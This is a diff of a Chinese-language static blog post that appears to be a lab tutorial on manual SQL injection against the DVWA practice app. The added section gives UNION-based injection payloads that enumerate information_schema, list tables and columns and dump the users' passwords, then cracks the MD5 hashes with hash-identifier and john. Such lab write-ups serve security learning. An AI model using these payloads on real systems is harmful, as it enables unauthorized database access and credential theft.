@@ -122,7 +122,15 @@
 <meta property="og:image" content="http://yoursite.com/images/20190715/img11.png">
 <meta property="og:image" content="http://yoursite.com/images/20190715/img12.png">
 <meta property="og:image" content="http://yoursite.com/images/20190715/img13.png">
-<meta property="og:updated_time" content="2019-07-16T07:35:44.566Z">
+<meta property="og:image" content="http://yoursite.com/images/20190715/img14.png">
+<meta property="og:image" content="http://yoursite.com/images/20190715/img15.png">
+<meta property="og:image" content="http://yoursite.com/images/20190715/img16.png">
+<meta property="og:image" content="http://yoursite.com/images/20190715/img17.png">
+<meta property="og:image" content="http://yoursite.com/images/20190715/img18.png">
+<meta property="og:image" content="http://yoursite.com/images/20190715/img19.png">
+<meta property="og:image" content="http://yoursite.com/images/20190715/img20.png">
+<meta property="og:image" content="http://yoursite.com/images/20190715/img21.png">
+<meta property="og:updated_time" content="2019-07-16T12:54:25.852Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="手动挖掘漏洞---SQL注入（一）">
 <meta name="twitter:description" content="SQL注入 所谓SQL注入，就是通过使用POST或GET方式把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
@@ -434,7 +442,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 15:35:44" itemprop="dateModified" datetime="2019-07-16T15:35:44+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-16 20:54:25" itemprop="dateModified" datetime="2019-07-16T20:54:25+08:00">2019-07-16</time>
               </span>
             
           
@@ -553,6 +561,35 @@
 </li>
 </ul>
 <p>使用连接字符串函数查询<span style="background-color: yellow">（ascii码中，32为空格，58为冒号：）</span><br><img src="/images/20190715/img12.png" alt="image"><br><img src="/images/20190715/img13.png" alt="image"></p>
+<h1 id="Mysql数据结构"><a href="#Mysql数据结构" class="headerlink" title="Mysql数据结构"></a>Mysql数据结构</h1><blockquote>
+<p>对表的meta data的查询需要使用information_schema.tables， table_schema是数据库的名称，table_name是具体的表名，table_type指的是表的类型<br><font color="red">MySQL：所有的元数据都保存在一张元数据表【information_schema】</font> </p>
+</blockquote>
+<h2 id="查看所有库所有表-统计库中表的数量"><a href="#查看所有库所有表-统计库中表的数量" class="headerlink" title="查看所有库所有表/统计库中表的数量"></a>查看所有库所有表/统计库中表的数量</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> table_name,table_schema <span class="keyword">from</span> information_schema.tables <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>查询所有数据库中的所有表<br><img src="/images/20190715/img14.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> table_schema,<span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> table_schema <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>统计每个数据库中的表数量<br><img src="/images/20190715/img15.png" alt="image"></p>
+<h2 id="Dvwa库中的表名"><a href="#Dvwa库中的表名" class="headerlink" title="Dvwa库中的表名"></a>Dvwa库中的表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> table_schema,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'dvwa'</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>查询dvwa库的表<br><img src="/images/20190715/img16.png" alt="image"></p>
+<h2 id="查询列名字段"><a href="#查询列名字段" class="headerlink" title="查询列名字段"></a>查询列名字段</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> table_name,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">"dvwa"</span> <span class="keyword">and</span> table_name=<span class="string">"users"</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>查询users表中的列名字段<br><img src="/images/20190715/img17.png" alt="image"></p>
+<h2 id="查询表中数据"><a href="#查询表中数据" class="headerlink" title="查询表中数据"></a>查询表中数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> dvwa.users <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>查询users表中的用户名、密码<br><img src="/images/20190715/img18.png" alt="image"></p>
+<p>到这里，用户名和密码都知道了，但是密码是加密过的，我们可以通过在线或离线的破解<br>可以利用一些工具对密码使用的加密方式进行判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/# hash-identifier</span><br></pre></td></tr></table></figure>
+
+<p>判断出来是md5哈希加密<br>这里用离线破解的方式<br>先将用户名密码保存至文件夹，格式如下<br><img src="/images/20190715/img19.png" alt="image"><br>用john进行破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/# john --format=raw-MD5 dvwa.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20190715/img20.png" alt="image"><br>如果出现以下错误，说明命令已经执行过了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])</span><br><span class="line">No password hashes left to crack (see FAQ)</span><br></pre></td></tr></table></figure>
+
+<p>命令执行后，会在“~”家目录里生成.john/的文件夹，里面有日志和破解后的明文文件<br>要再执行，删除这两个文件即可<br><img src="/images/20190715/img21.png" alt="image"></p>
+<hr>
 
       
     </div>
@@ -801,7 +838,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql数据结构"><span class="nav-number">2.</span> <span class="nav-text">Mysql数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看所有库所有表-统计库中表的数量"><span class="nav-number">2.1.</span> <span class="nav-text">查看所有库所有表/统计库中表的数量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dvwa库中的表名"><span class="nav-number">2.2.</span> <span class="nav-text">Dvwa库中的表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查询列名字段"><span class="nav-number">2.3.</span> <span class="nav-text">查询列名字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查询表中数据"><span class="nav-number">2.4.</span> <span class="nav-text">查询表中数据</span></a></li></ol></li></ol></div>
             
 
           </div>
